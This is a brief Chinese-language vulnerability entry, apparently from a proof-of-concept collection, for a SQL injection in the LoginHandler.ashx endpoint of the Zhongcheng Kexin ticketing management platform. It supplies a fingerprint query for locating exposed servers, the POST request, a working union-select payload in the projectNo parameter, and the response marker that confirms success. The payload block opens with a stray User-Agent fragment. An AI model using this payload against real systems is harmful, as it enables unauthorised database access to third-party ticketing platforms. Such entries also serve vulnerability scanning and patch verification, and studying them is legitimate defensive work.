# 中成科信票务管理平台LoginHandler存在SQL注入漏洞

中成科信票务管理平台 ｜ SQL注入 ｜ —
- **指纹**：`body="SystemManager/SoftwareLicense.htm"`
- **请求**：`POST /LoginHandler.ashx HTTP/1.1`

**Payload**
```
like Gecko) Chrome/91.0.4472.77 Safari/537.36
Method=GetSeller&projectNo=1'union+select+1,sys.fn_sqlvarbasetostr(HashBytes('MD5','123'))--+
```
- **响应特征**：200 202cb